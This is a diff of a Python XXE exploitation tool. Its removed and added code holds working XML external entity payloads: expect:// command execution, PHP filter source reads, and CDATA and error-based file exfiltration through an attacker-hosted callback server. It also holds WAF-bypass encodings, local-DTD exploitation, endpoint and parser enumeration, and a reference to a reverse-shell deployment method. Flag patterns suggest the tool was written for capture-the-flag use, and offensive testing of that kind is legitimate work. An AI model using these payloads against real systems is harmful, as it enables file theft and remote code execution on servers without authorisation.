-        print(f"{Colors.INFO}[*] Command: {command}{Colors.RESET}")
-        print(f"{Colors.WARNING}[!] Note: expect:// requires PHP expect module (rarely enabled){Colors.RESET}")
-        
-        # Test with expect wrapper
-        payload = PayloadGenerator.xxe_expect_rce(command)
-        response = self.send_payload(payload, f"expect:// RCE - {command}")
-        
-        if not response:
-            print(f"{Colors.WARNING}[-] No response received{Colors.RESET}")
-            return False
-        
-        # Check for command output indicators
-        indicators = {
-            'id': ['uid=', 'gid=', 'groups='],
-            'whoami': ['www-data', 'root', 'apache', 'nginx'],
-            'pwd': ['/', 'var', 'www', 'home'],
-            'ls': ['index', 'config', 'total'],
-            'cat': ['<?php', 'root:', 'config', 'password']
-        }
-        
-        cmd_base = command.split()[0]
-        expected = indicators.get(cmd_base, [command.split()[0]])
-        
-        found = False
-        for indicator in expected:
-            if indicator.lower() in response.text.lower():
-                found = True
-                print(f"{Colors.SUCCESS}[!] CRITICAL: RCE CONFIRMED with expect://!{Colors.RESET}")
-                print(f"{Colors.SUCCESS}[+] Command executed successfully: {command}{Colors.RESET}")
-                print(f"\n{Colors.INFO}[*] Command Output:{Colors.RESET}")
-                print(response.text[:800])
-                
-                self.vulnerabilities_found.append({
-                    'type': 'XXE RCE - expect:// wrapper',
-                    'payload': payload,
-                    'command': command,
-                    'output': response.text[:500]
-                })
-                return True
-        
-        if not found:
-            print(f"{Colors.WARNING}[-] Command output not detected{Colors.RESET}")
-            print(f"{Colors.INFO}[*] Response preview:{Colors.RESET}")
-            print(response.text[:500])
-            print(f"\n{Colors.INFO}[*] expect:// may not be enabled or output not reflected{Colors.RESET}")
-        
-        return False
-    
-    def test_php_filter_source_read(self, file_path: str = "index.php") -> bool:
-        """Test PHP filter wrapper for source code disclosure"""
-        print(f"\n{Colors.HEADER}[*] Testing PHP Filter Wrapper for Source Code Disclosure{Colors.RESET}")
-        print(f"{Colors.INFO}[*] Target file: {file_path}{Colors.RESET}")
-        print(f"{Colors.INFO}[*] Using: php://filter/convert.base64-encode/resource={file_path}{Colors.RESET}")
-        
-        payload = PayloadGenerator.xxe_php_wrapper_base64(file_path)
-        response = self.send_payload(payload, f"PHP Filter - {file_path}")
-        
-        if not response:
-            print(f"{Colors.WARNING}[-] No response received{Colors.RESET}")
-            return False
-        
-        # Check if response contains base64 data
-        import re
-        import base64
-        
-        # Look for base64 patterns (at least 40 consecutive valid base64 chars)
-        base64_pattern = r'[A-Za-z0-9+/]{40,}={0,2}'
-        matches = re.findall(base64_pattern, response.text)
-        
-        if matches:
-            print(f"{Colors.SUCCESS}[!] PHP Filter Wrapper SUCCESS!{Colors.RESET}")
-            print(f"{Colors.SUCCESS}[+] Found base64-encoded data in response{Colors.RESET}")
-            
-            for idx, match in enumerate(matches[:3], 1):  # Show first 3 matches
-                print(f"\n{Colors.INFO}[*] Base64 Data #{idx}:{Colors.RESET}")
-                print(f"{match[:100]}{'...' if len(match) > 100 else ''}")
-                
-                # Try to decode
-                try:
-                    decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
-                    if len(decoded) > 20 and ('<' in decoded or '<?php' in decoded or 'function' in decoded):
-                        print(f"\n{Colors.SUCCESS}[+] Successfully decoded - appears to be source code!{Colors.RESET}")
-                        print(f"{Colors.INFO}[*] Decoded content preview:{Colors.RESET}")
-                        print(decoded[:500])
-                        
-                        self.vulnerabilities_found.append({
-                            'type': 'XXE PHP Filter - Source Code Disclosure',
-                            'payload': payload,
-                            'file': file_path,
-                            'decoded': decoded[:1000]
-                        })
-                        return True
-                except Exception as e:
-                    if self.verbose:
-                        print(f"{Colors.WARNING}[-] Decoding failed: {str(e)}{Colors.RESET}")
-                    continue
-        
-        print(f"{Colors.WARNING}[-] PHP filter wrapper did not return base64 data{Colors.RESET}")
-        print(f"{Colors.INFO}[*] Response preview:{Colors.RESET}")
-        print(response.text[:500])
-        
-        return False
-    
-    def test_xxe_cdata_exfiltration(self, file_path: str = None) -> bool:
-        """Test CDATA wrapping for advanced file exfiltration"""
-        if not self.callback_url:
-            print(f"{Colors.WARNING}[-] CDATA exfiltration requires --callback or --callback-ip{Colors.RESET}")
-            print(f"{Colors.INFO}[*] Usage: --callback-ip YOUR_IP --callback-port 8080{Colors.RESET}")
-            return False
-        
-        file_path = file_path or self.file_path
-        
-        print(f"\n{Colors.HEADER}[*] Testing CDATA Wrapping Exfiltration{Colors.RESET}")
-        print(f"{Colors.INFO}[*] Target file: {file_path}{Colors.RESET}")
-        print(f"{Colors.INFO}[*] Callback: {self.callback_url}{Colors.RESET}")
-        print(f"{Colors.INFO}[*] Callback Port: {self.callback_port}{Colors.RESET}")
-        print(f"{Colors.INFO}[*] This bypasses XML format restrictions{Colors.RESET}")
-        
-        # First, detect working XML structure if not already done
-        if not self.working_structure:
-            print(f"\n{Colors.INFO}[*] Detecting working XML structure first...{Colors.RESET}")
-            if not self.detect_xxe_entity_injection():
-                print(f"{Colors.WARNING}[!] Could not detect working XML structure{Colors.RESET}")
-                print(f"{Colors.WARNING}[!] Proceeding with generic CDATA payload anyway...{Colors.RESET}")
-        
-        # Start OOB server
-        self._start_oob_server()
-        
-        # Generate payloads
-        if self.working_structure:
-            # Use detected structure
-            print(f"\n{Colors.SUCCESS}[+] Using detected XML structure for CDATA payload{Colors.RESET}")
-            
-            # Build CDATA payload with detected structure
-            dtd_content = '''<!ENTITY joined "%begin;%file;%end;">'''
-            
-            # Replace the test entity with CDATA wrapper
-            xml_payload = self.working_structure.replace(
-                '<!ENTITY ghosttest "{test_value}">',
-                f'''<!ENTITY % begin "<![CDATA[">
-  <!ENTITY % file SYSTEM "file://{file_path}">
-  <!ENTITY % end "]]>">
-  <!ENTITY % xxe SYSTEM "{self.callback_url}/xxe.dtd">
-  %xxe;'''
-            ).replace('&ghosttest;', '&joined;')
-        else:
-            # Fallback to generic payload
-            xml_payload, dtd_content = PayloadGenerator.xxe_cdata_exfiltration(self.callback_url, file_path)
-        
-        # Set DTD content for server
-        OOBServer.dtd_payload = dtd_content.encode()
-        
-        print(f"\n{Colors.INFO}[*] DTD Content (hosted on your server at {self.callback_url}/xxe.dtd):{Colors.RESET}")
-        print(f"{Colors.PAYLOAD}{dtd_content}{Colors.RESET}")
-        
-        print(f"\n{Colors.INFO}[*] Sending CDATA payload...{Colors.RESET}")
-        if self.verbose:
-            print(f"\n{Colors.PAYLOAD}Payload:{Colors.RESET}")
-            print(xml_payload)
-        
-        response = self.send_payload(xml_payload, f"CDATA Exfiltration - {file_path}")
-        
-        if response:
-            print(f"\n{Colors.SUCCESS}[+] Payload sent! Response received:{Colors.RESET}")
-            print(f"{Colors.INFO}[*] Response length: {len(response.text)}{Colors.RESET}")
-            
-            # Check if file content appears in response wrapped in CDATA
-            if '<![CDATA[' in response.text:
-                print(f"\n{Colors.SUCCESS}[!] CDATA tags found in response!{Colors.RESET}")
-                print(f"{Colors.SUCCESS}[+] File content retrieved{Colors.RESET}")
-                
-                # Extract CDATA content
-                import re
-                cdata_match = re.search(r'<!\[CDATA\[(.*?)\]\]>', response.text, re.DOTALL)
-                if cdata_match:
-                    file_content = cdata_match.group(1)
-                    print(f"\n{Colors.SUCCESS}📄 FILE CONTENT:{Colors.RESET}")
-                    print("=" * 70)
-                    print(file_content[:2000])
-                    if len(file_content) > 2000:
-                        print(f"\n... [Content truncated - {len(file_content)} total bytes]")
-                    print("=" * 70)
-                
-                self.vulnerabilities_found.append({
-                    'type': 'XXE CDATA Exfiltration',
-                    'payload': xml_payload,
-                    'file': file_path
-                })
-                return True
-            
-            # Check if &joined; entity was processed
-            elif '&joined;' not in response.text and len(response.text) > 100:
-                print(f"\n{Colors.SUCCESS}[+] Entity processed! Checking for file content...{Colors.RESET}")
-                print(f"\n{Colors.INFO}[*] Response preview:{Colors.RESET}")
-                print(response.text[:500])
-                
-                # Check for PHP tags or other file indicators
-                if '<?php' in response.text or 'function' in response.text or file_path.split('/')[-1] in response.text:
-                    print(f"\n{Colors.SUCCESS}[!] File content may be present in response!{Colors.RESET}")
-                    self.vulnerabilities_found.append({
-                        'type': 'XXE CDATA Exfiltration',
-                        'payload': xml_payload,
-                        'file': file_path
-                    })
-                    return True
-            else:
-                print(f"\n{Colors.WARNING}[-] Response preview:{Colors.RESET}")
-                print(response.text[:200])
-        
-        print(f"\n{Colors.WARNING}[-] CDATA exfiltration did not return expected data{Colors.RESET}")
-        print(f"{Colors.INFO}[*] Possible reasons:{Colors.RESET}")
-        print(f"{Colors.INFO}    - Target didn't fetch xxe.dtd from {self.callback_url}{Colors.RESET}")
-        print(f"{Colors.INFO}    - External DTD loading is disabled{Colors.RESET}")
-        print(f"{Colors.INFO}    - Network connectivity issue{Colors.RESET}")
-        return False
-    
-    def test_xxe_error_based_exfiltration(self, file_path: str = None) -> bool:
-        """Test Error-Based XXE for blind exploitation"""
-        if not self.callback_url:
-            print(f"{Colors.WARNING}[-] Error-based exfiltration requires --callback or --callback-ip{Colors.RESET}")
-            print(f"{Colors.INFO}[*] Usage: --callback-ip YOUR_IP --callback-port 9000{Colors.RESET}")
-            return False
-        
-        file_path = file_path or self.file_path
-        
-        print(f"\n{Colors.HEADER}[*] Testing Error-Based XXE Exfiltration{Colors.RESET}")
-        print(f"{Colors.INFO}[*] Target file: {file_path}{Colors.RESET}")
-        print(f"{Colors.INFO}[*] Callback: {self.callback_url}{Colors.RESET}")
-        print(f"{Colors.INFO}[*] Callback Port: {self.callback_port}{Colors.RESET}")
-        print(f"{Colors.INFO}[*] Forces errors to exfiltrate data (blind XXE){Colors.RESET}")
-        
-        # Start OOB server
-        self._start_oob_server()
-        
-        # Generate payloads
-        xml_payload, dtd_content = PayloadGenerator.xxe_error_based_exfiltration(self.callback_url, file_path)
-        
-        # Set DTD content for server
-        OOBServer.dtd_payload = dtd_content.encode()
-        
-        print(f"\n{Colors.INFO}[*] DTD Content (save as xxe.dtd on your server):{Colors.RESET}")
-        print(f"{Colors.PAYLOAD}{dtd_content}{Colors.RESET}")
-        
-        print(f"\n{Colors.INFO}[*] Sending error-based payload...{Colors.RESET}")
-        response = self.send_payload(xml_payload, f"Error-Based Exfiltration - {file_path}")
-        
-        if response:
-            # Check if error message contains file content
-            error_indicators = [
-                'failed to load external entity',
-                'nonExistingEntity',
-                'Parser error',
-                'XML parsing error',
-                'DOMDocument::loadXML',
-                'Invalid URI',
-                'loadXML()',
-                'Entity',
-                file_path
-            ]
-            
-            has_error = any(indicator.lower() in response.text.lower() for indicator in error_indicators)
-            
-            if has_error:
-                print(f"\n{Colors.SUCCESS}[!] Error-based exfiltration successful!{Colors.RESET}")
-                print(f"{Colors.SUCCESS}[+] File content leaked via error message!{Colors.RESET}")
-                
-                import re
-                import html
-                
-                # HTML decode the entire response
-                decoded_response = html.unescape(response.text)
-                
-                # Remove HTML tags for cleaner reading
-                text_only = re.sub(r'<script[^>]*>.*?</script>', '', decoded_response, flags=re.DOTALL | re.IGNORECASE)
-                text_only = re.sub(r'<style[^>]*>.*?</style>', '', text_only, flags=re.DOTALL | re.IGNORECASE)
-                text_only = re.sub(r'<[^>]+>', '\n', text_only)  # Replace tags with newlines
-                text_only = re.sub(r'\n\s*\n', '\n', text_only)  # Remove multiple blank lines
-                text_only = text_only.strip()
-                
-                # Extract file content from "Invalid URI" errors
-                file_content = None
-                uri_match = re.search(r'Invalid URI:\s*/([^/\n]+)', decoded_response, re.IGNORECASE)
-                if uri_match:
-                    file_content = '/' + uri_match.group(1)
-                
-                # Alternative: Extract from entity errors
-                if not file_content:
-                    entity_match = re.search(r'Entity.*?:\s*/([^\s<\n]+)', decoded_response, re.IGNORECASE)
-                    if entity_match:
-                        file_content = '/' + entity_match.group(1)
-                
-                # Look for content between markers
-                if not file_content:
-                    # Try to find actual file content (anything between / and "in Entity" or similar)
-                    content_match = re.search(r':\s*(/[^:]+?)\s+in\s+(?:Entity|<b>)', decoded_response, re.IGNORECASE)
-                    if content_match:
-                        file_content = content_match.group(1).strip()
-                
-                # Show extracted file content
-                if file_content:
-                    print(f"\n{Colors.SUCCESS}📄 EXTRACTED FILE CONTENT:{Colors.RESET}")
-                    print("=" * 70)
-                    print(file_content)
-                    print("=" * 70)
-                
-                # Look for flags
-                flag_patterns = [
-                    r'HTB\{[^}]+\}',
-                    r'FLAG\{[^}]+\}',
-                    r'flag\{[^}]+\}',
-                    r'\$flag\s*=\s*["\']([^"\']+)["\']',
-                ]
-                
-                flags_found = []
-                for pattern in flag_patterns:
-                    matches = re.findall(pattern, decoded_response, re.IGNORECASE)
-                    flags_found.extend(matches)
-                
-                if flags_found:
-                    print(f"\n{Colors.SUCCESS}🚩 FLAGS DETECTED:{Colors.RESET}")
-                    print("=" * 70)
-                    for flag in set(flags_found):
-                        print(f"{Colors.SUCCESS}{flag}{Colors.RESET}")
-                    print("=" * 70)
-                
-                # Show complete decoded error (most important for real-world testing)
-                print(f"\n{Colors.INFO}[*] COMPLETE DECODED ERROR MESSAGE:{Colors.RESET}")
-                print(f"{Colors.INFO}[*] (Check for credentials, API keys, config data, etc.){Colors.RESET}")
-                print("=" * 70)
-                
-                # Find and display the error section
-                error_lines = []
-                for line in text_only.split('\n'):
-                    line = line.strip()
-                    if not line:
-                        continue
-                    # Include lines with error indicators or that look like content
-                    if any(ind.lower() in line.lower() for ind in error_indicators) or \
-                       'warning' in line.lower() or 'notice' in line.lower() or \
-                       '<?php' in line.lower() or '$' in line or '{' in line:
-                        error_lines.append(line)
-                
-                if error_lines:
-                    print('\n'.join(error_lines[:50]))  # Show up to 50 relevant lines
-                else:
-                    # Fallback: show raw decoded response
-                    print(decoded_response[:2000])
-                
-                print("=" * 70)
-                
-                # Save full response to file for analysis
-                output_file = f"/tmp/xxe_error_{file_path.replace('/', '_')}.txt"
-                try:
-                    with open(output_file, 'w') as f:
-                        f.write("="*70 + "\n")
-                        f.write("FULL HTML-DECODED ERROR RESPONSE\n")
-                        f.write("="*70 + "\n\n")
-                        f.write(decoded_response)
-                    print(f"\n{Colors.INFO}[*] Full response saved to: {output_file}{Colors.RESET}")
-                except:
-                    pass
-                
-                self.vulnerabilities_found.append({
-                    'type': 'XXE Error-Based Exfiltration',
-                    'payload': xml_payload,
-                    'file': file_path,
-                    'response': response.text[:500],
-                    'flags': flags_found if flags_found else None,
-                    'file_content': file_content if file_content else None
-                })
-                return True
-        
-        print(f"{Colors.WARNING}[-] Error-based exfiltration did not trigger expected errors{Colors.RESET}")
-        return False
-    
     def exploit_oob_http(self) -> bool:
         """Exploit XXE with OOB HTTP callback"""
         if not self.callback_url:
@@ -2305,38 +1809,16 @@ class XXEScanner:
         """Start OOB HTTP server in background thread"""
         print(f"{Colors.INFO}[*] Starting OOB server on port {self.callback_port}...{Colors.RESET}")
         
-        # Test if port is available before starting server
-        import socket
-        test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        test_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        
-        try:
-            test_socket.bind(('0.0.0.0', self.callback_port))
-            test_socket.close()
-        except OSError as e:
-            if e.errno == 98:  # Address already in use
-                print(f"{Colors.ERROR}[!] ERROR: Port {self.callback_port} is already in use!{Colors.RESET}")
-                print(f"{Colors.WARNING}[*] Solutions:{Colors.RESET}")
-                print(f"{Colors.INFO}    1. Use different port: --callback-port 8002{Colors.RESET}")
-                print(f"{Colors.INFO}    2. Find what's using it: sudo netstat -tulpn | grep :{self.callback_port}{Colors.RESET}")
-                print(f"{Colors.INFO}    3. Kill the process: sudo lsof -ti:{self.callback_port} | xargs kill{Colors.RESET}")
-                raise RuntimeError(f"Port {self.callback_port} is already in use")
-            else:
-                raise
-        
         def run_server():
-            try:
-                server = HTTPServer(('0.0.0.0', self.callback_port), OOBServer)
-                server.timeout = 1
-                print(f"{Colors.SUCCESS}[+] OOB server successfully bound to port {self.callback_port}{Colors.RESET}")
-                for _ in range(30):  # Run for 30 seconds
-                    server.handle_request()
-            except Exception as e:
-                print(f"{Colors.ERROR}[!] Server error: {e}{Colors.RESET}")
+            server = HTTPServer(('0.0.0.0', self.callback_port), OOBServer)
+            server.timeout = 1
+            for _ in range(10):  # Run for 10 seconds
+                server.handle_request()
         
         server_thread = threading.Thread(target=run_server, daemon=True)
         server_thread.start()
-        time.sleep(1)  # Give server time to start
+        time.sleep(1)
+        print(f"{Colors.SUCCESS}[+] OOB server started{Colors.RESET}")
     
     def deploy_reverse_shell(self, attacker_ip: str, attacker_port: int):
         """Deploy reverse shell via XXE"""
@@ -2729,6 +2211,21 @@ Product Version: <xsl:value-of select="system-property('xsl:product-version')" /
             'vulnerabilities': []  # List of vulnerability types found
         }
         
+        # Test 0: Parser fingerprint + content-type acceptance matrix -- both
+        # feed the classification below and cost only a handful of requests.
+        try:
+            dtd_blocked = self.fingerprint_parser()
+            if self.parser_fingerprint:
+                results['findings'].append(f"Parser: {self.parser_fingerprint}")
+            if dtd_blocked:
+                results['findings'].append("Parser reports DTD processing blocked")
+                results['next_steps'].append("Try UTF-16/UTF-7 encoding bypasses and XInclude")
+            self.enumerate_content_types()
+            for content_type in self.accepted_content_types:
+                results['findings'].append(f"Parses XML as: {content_type}")
+        except Exception:
+            pass
+
         # Test 1: Check if endpoint accepts XML
         print(f"{Colors.INFO}[*] Test 1/5: Checking if endpoint accepts XML input{Colors.RESET}")
         
@@ -3000,13 +2497,12 @@ Product Version: <xsl:value-of select="system-property('xsl:product-version')" /
             print()
         
         # Next Steps
-        next_steps = results.get('next_steps', [])
-        if next_steps and isinstance(next_steps, list):
+        if results['next_steps']:
             print(f"{Colors.HEADER}╔════════════════════════════════════════════════════════════╗{Colors.RESET}")
             print(f"{Colors.HEADER}║ RECOMMENDED NEXT STEPS                                     ║{Colors.RESET}")
             print(f"{Colors.HEADER}╚════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
             
-            for idx, step in enumerate(next_steps, 1):
+            for idx, step in enumerate(results['next_steps'], 1):
                 print(f"{Colors.WARNING}[{idx}] {step}{Colors.RESET}")
             print()
         
@@ -3107,21 +2603,447 @@ Product Version: <xsl:value-of select="system-property('xsl:product-version')" /
                 'findings': results['findings']
             })
     
+    # ==================================================================
+    # Phase 0: Enumeration -- parser, content types, endpoints, protocols
+    # ==================================================================
+
+    PARSER_SIGNATURES = [
+        ('libxml', 'libxml2 (PHP/Python lxml)'),
+        ('simplexml', 'SimpleXML (PHP)'),
+        ('domdocument', 'DOMDocument (PHP)'),
+        ('org.xml.sax', 'SAX/Xerces (Java)'),
+        ('saxparseexception', 'SAX/Xerces (Java)'),
+        ('javax.xml', 'JAXP (Java)'),
+        ('com.sun.org.apache.xerces', 'Xerces (Java internal)'),
+        ('system.xml', 'System.Xml (.NET)'),
+        ('xmlexception', 'System.Xml (.NET)'),
+        ('expat', 'expat (C/Python)'),
+        ('xml.etree', 'ElementTree (Python)'),
+        ('nokogiri', 'Nokogiri (Ruby)'),
+        ('rexml', 'REXML (Ruby)'),
+        ('sax-js', 'sax-js (Node.js)'),
+        ('libxmljs', 'libxmljs (Node.js)'),
+        ('msxml', 'MSXML (Windows)'),
+    ]
+
+    DTD_BLOCKED_SIGNATURES = [
+        'doctype is disallowed', 'dtd is prohibited', 'dtd processing is not allowed',
+        'disallow-doctype-decl', 'entity references are not allowed',
+        'external entity', 'entity_loader', 'xxe',
+    ]
+
+    XML_ENDPOINT_CANDIDATES = [
+        '/xmlrpc.php', '/xmlrpc', '/RPC2', '/soap', '/soap/', '/api/soap',
+        '/ws', '/ws/', '/services', '/services/', '/service.asmx',
+        '/api/xml', '/xml', '/feed', '/rss', '/sitemap.xml',
+        '/wsdl', '/?wsdl', '/soap?wsdl', '/services?wsdl',
+        '/saml/SSO', '/saml/acs', '/sso/saml', '/Shibboleth.sso/SAML2/POST',
+        '/cgi-bin/xml', '/api/import', '/import', '/upload/xml',
+    ]
+
+    def fingerprint_parser(self):
+        """Identify the backend XML parser from error messages, and check
+        whether DTD/entity processing is blocked outright. Knowing the
+        parser decides which payload families are worth firing."""
+        print(f"\n{Colors.HEADER}[*] Phase 0a: XML Parser Fingerprinting{Colors.RESET}")
+
+        probes = [
+            ('Malformed XML', '<?xml version="1.0"?><r><unclosed></r>'),
+            ('Bad entity ref', '<?xml version="1.0"?><r>&undefined_entity;</r>'),
+            ('DOCTYPE probe', '<?xml version="1.0"?><!DOCTYPE r [ <!ENTITY g "ghost"> ]><r>&g;</r>'),
+        ]
+
+        dtd_blocked = False
+        for name, probe in probes:
+            response = self.send_payload(probe, f"Fingerprint - {name}")
+            if not response:
+                continue
+            text_lower = response.text.lower()
+            for signature, parser in self.PARSER_SIGNATURES:
+                if signature in text_lower:
+                    self.parser_fingerprint = parser
+                    print(f"{Colors.SUCCESS}[+] Parser identified: {parser} "
+                          f"(via '{signature}' in {name} response){Colors.RESET}")
+                    break
+            if name == 'DOCTYPE probe':
+                if any(sig in text_lower for sig in self.DTD_BLOCKED_SIGNATURES):
+                    dtd_blocked = True
+                    print(f"{Colors.WARNING}[!] Parser reports DTD/entity processing BLOCKED "
+                          f"-- encoding bypasses and XInclude are the best remaining angles{Colors.RESET}")
+            if self.parser_fingerprint:
+                break
+
+        if not self.parser_fingerprint:
+            print(f"{Colors.INFO}[*] Parser not identifiable from errors (errors may be suppressed){Colors.RESET}")
+        else:
+            hints = {
+                'PHP': 'php://filter + expect:// payloads prioritized',
+                'Java': 'jar:/netdoc:/gopher: + FTP OOB payloads prioritized',
+                '.NET': 'local DTD (cim20.dtd) + PUBLIC identifier payloads prioritized',
+                'Python': 'billion-laughs hardened? ElementTree ignores DTD by default',
+            }
+            for family, hint in hints.items():
+                if family in self.parser_fingerprint:
+                    print(f"{Colors.INFO}[*] Strategy: {hint}{Colors.RESET}")
+        return dtd_blocked
+
+    def enumerate_content_types(self):
+        """Find every Content-Type under which the endpoint still parses XML
+        -- including JSON endpoints that transparently convert (Content-Type
+        coercion is the #1 way XXE hides in modern REST APIs)."""
+        print(f"\n{Colors.HEADER}[*] Phase 0b: Content-Type Acceptance Matrix{Colors.RESET}")
+
+        marker = 'GHOST_CT_PROBE'
+        probe = f'<?xml version="1.0"?><!DOCTYPE r [ <!ENTITY g "{marker}"> ]><r>&g;</r>'
+        candidates = [
+            'application/xml', 'text/xml', 'application/soap+xml',
+            'application/xhtml+xml', 'application/rss+xml', 'image/svg+xml',
+            'application/xml;charset=UTF-8', 'text/plain', 'application/json',
+        ]
+
+        for content_type in candidates:
+            response = self.send_payload(probe, f"Content-Type: {content_type}", content_type=content_type)
+            if not response:
+                continue
+            if marker in response.text:
+                self.accepted_content_types.append(content_type)
+                print(f"{Colors.SUCCESS}[+] XML PARSED as {content_type} (entity substituted!){Colors.RESET}")
+            elif response.status_code < 415 and response.status_code != 400:
+                print(f"{Colors.INFO}[*] Accepted (no reflection) as {content_type} "
+                      f"[HTTP {response.status_code}]{Colors.RESET}")
+            elif self.verbose:
+                print(f"{Colors.WARNING}[-] Rejected as {content_type} [HTTP {response.status_code}]{Colors.RESET}")
+
+        if 'application/json' in self.accepted_content_types:
+            print(f"{Colors.ERROR}[!] CRITICAL SURFACE: JSON endpoint parses XML "
+                  f"(content-type coercion) -- classic hidden XXE{Colors.RESET}")
+            self.vulnerabilities_found.append({
+                'type': 'Content-Type Coercion (JSON endpoint parses XML)',
+                'severity': 'HIGH',
+                'evidence': f'Entity value {marker} substituted with Content-Type: application/json',
+                'payload': probe,
+            })
+
+    def enumerate_xml_endpoints(self):
+        """Sweep the target host for other XML-consuming endpoints (SOAP,
+        XML-RPC, SAML, feeds) worth pointing this tool at next."""
+        print(f"\n{Colors.HEADER}[*] Phase 0c: XML Endpoint Discovery (host-wide){Colors.RESET}")
+        parsed = urlparse(self.target_url)
+        base = f"{parsed.scheme}://{parsed.netloc}"
+        probe = '<?xml version="1.0"?><r>ghost</r>'
+        found = []
+
+        for path in self.XML_ENDPOINT_CANDIDATES:
+            url = base + path
+            try:
+                response = self.session.post(url, data=probe,
+                                             headers={**self.headers, 'Content-Type': 'text/xml'},
+                                             cookies=self.cookies, timeout=self.timeout,
+                                             proxies=self.proxy, verify=False)
+                text_lower = response.text[:2000].lower()
+                xmlish = ('xml' in response.headers.get('Content-Type', '').lower()
+                          or 'soap' in text_lower or 'faultcode' in text_lower
+                          or 'methodresponse' in text_lower or '<?xml' in text_lower)
+                if response.status_code in (200, 405, 500) and xmlish:
+                    found.append((path, response.status_code))
+                    print(f"{Colors.SUCCESS}[+] XML-speaking endpoint: {path} [HTTP {response.status_code}]{Colors.RESET}")
+            except requests.exceptions.RequestException:
+                pass
+
+        if found:
+            print(f"{Colors.INFO}[*] {len(found)} additional XML endpoints -- rerun with -u {base}<path>{Colors.RESET}")
+        else:
+            print(f"{Colors.INFO}[*] No additional XML endpoints found on host{Colors.RESET}")
+        return found
+
+    def enumerate_protocol_support(self):
+        """Build a URL-scheme support matrix. Each supported scheme unlocks
+        a different exploitation path (php:// = binary-safe read, expect://
+        = RCE, jar:/gopher: = Java SSRF pivots, etc.)."""
+        print(f"\n{Colors.HEADER}[*] Phase 0d: Protocol/Scheme Support Enumeration{Colors.RESET}")
+
+        # Control: an unsupported garbage scheme, to learn the "unsupported"
+        # error shape so real schemes can be diffed against it.
+        control = self.send_payload(PayloadGenerator.scheme_probe('ghostproto://x/y'),
+                                    'Protocol control (bogus scheme)')
+        control_sig = (control.status_code, len(control.text)) if control else None
+
+        for name, url, meaning in PayloadGenerator.PROTOCOL_PROBES:
+            response = self.send_payload(PayloadGenerator.scheme_probe(url), f'Protocol probe: {name}')
+            if not response:
+                continue
+            if 'GHOST_DATA_OK' in response.text:
+                verdict = 'CONFIRMED (data echoed)'
+            elif control_sig and (response.status_code, len(response.text)) != control_sig:
+                verdict = 'likely supported (differs from bogus-scheme control)'
+            else:
+                verdict = None
+            if verdict:
+                self.supported_protocols.append(name)
+                print(f"{Colors.SUCCESS}[+] {name:<12} {verdict}  -> {meaning}{Colors.RESET}")
+            elif self.verbose:
+                print(f"{Colors.WARNING}[-] {name:<12} no support indication{Colors.RESET}")
+
+        if 'expect' in self.supported_protocols:
+            print(f"{Colors.ERROR}[!] expect:// reachable -- direct RCE candidate "
+                  f"(--interactive mode){Colors.RESET}")
+
+    # ==================================================================
+    # Advanced detection batteries
+    # ==================================================================
+
+    def detect_xxe_encoding_bypass(self) -> bool:
+        """UTF-16LE/BE and UTF-7 byte-level payloads -- these sail past WAFs
+        and app-layer filters that regex-scan for ASCII '<!DOCTYPE'."""
+        print(f"\n{Colors.HEADER}[*] Phase: Encoding-Bypass XXE Battery (UTF-16/UTF-7){Colors.RESET}")
+        found = False
+
+        attempts = [
+            ('UTF-16LE bytes', PayloadGenerator.xxe_utf16_bytes(self.file_path, 'le'),
+             'application/xml;charset=UTF-16'),
+            ('UTF-16BE bytes', PayloadGenerator.xxe_utf16_bytes(self.file_path, 'be'),
+             'application/xml;charset=UTF-16'),
+            ('UTF-7 declared', PayloadGenerator.xxe_utf7_encoded(self.file_path), None),
+        ]
+        for name, payload, content_type in attempts:
+            response = self.send_payload(payload, f'Encoding bypass - {name}', content_type=content_type)
+            if response and self._check_xxe_response(response, self.file_path):
+                print(f"{Colors.ERROR}[!] XXE via {name} -- filter/WAF bypassed{Colors.RESET}")
+                self.vulnerabilities_found.append({
+                    'type': f'XXE via encoding bypass ({name})',
+                    'severity': 'CRITICAL',
+                    'evidence': f'{self.file_path} content returned using {name} payload',
+                    'payload': payload if isinstance(payload, str) else f'<{len(payload)} raw bytes>',
+                })
+                found = True
+        if not found:
+            print(f"{Colors.INFO}[*] No encoding-bypass hits{Colors.RESET}")
+        return found
+
+    def detect_xxe_waf_bypass(self) -> bool:
+        """DOCTYPE mutation battery: parameter-entity indirection, PUBLIC
+        identifiers, whitespace/comment mutations, nested entity hops."""
+        print(f"\n{Colors.HEADER}[*] Phase: WAF/Filter Bypass DOCTYPE Battery{Colors.RESET}")
+        found = False
+        for name, payload in PayloadGenerator.xxe_waf_bypass_variants(self.file_path):
+            response = self.send_payload(payload, f'WAF bypass - {name}')
+            if response and self._check_xxe_response(response, self.file_path):
+                print(f"{Colors.ERROR}[!] XXE via DOCTYPE mutation: {name}{Colors.RESET}")
+                self.vulnerabilities_found.append({
+                    'type': f'XXE via DOCTYPE mutation ({name})',
+                    'severity': 'CRITICAL',
+                    'evidence': f'{self.file_path} content returned',
+                    'payload': payload,
+                })
+                self.working_read_template = payload.replace(self.file_path, '{FILE}')
+                found = True
+        if not found:
+            print(f"{Colors.INFO}[*] No DOCTYPE-mutation hits{Colors.RESET}")
+        return found
+
+    def enumerate_local_dtds(self) -> list:
+        """Probe for local DTD files on the target (existence oracle via
+        error deltas), then attempt the parameter-entity-redefinition
+        exploit against each one found. Works fully offline -- the go-to
+        technique when outbound traffic is firewalled."""
+        print(f"\n{Colors.HEADER}[*] Phase: Local DTD Enumeration & Exploitation{Colors.RESET}")
+
+        # Error shape for a path we KNOW doesn't exist
+        control = self.send_payload(
+            PayloadGenerator.local_dtd_existence_probe('/ghostops/definitely/missing.dtd'),
+            'Local DTD control (missing path)')
+        control_sig = (control.status_code, len(control.text)) if control else None
+
+        present = []
+        for dtd_path, entity_name, os_hint in PayloadGenerator.LOCAL_DTD_CANDIDATES:
+            response = self.send_payload(PayloadGenerator.local_dtd_existence_probe(dtd_path),
+                                         f'Local DTD probe: {dtd_path}')
+            if not response or not control_sig:
+                continue
+            if (response.status_code, len(response.text)) != control_sig:
+                present.append((dtd_path, entity_name, os_hint))
+                print(f"{Colors.SUCCESS}[+] Local DTD exists: {dtd_path}  [{os_hint}]{Colors.RESET}")
+
+        for dtd_path, entity_name, os_hint in present:
+            if not entity_name:
+                continue
+            payload = PayloadGenerator.local_dtd_exploit(dtd_path, entity_name, self.file_path)
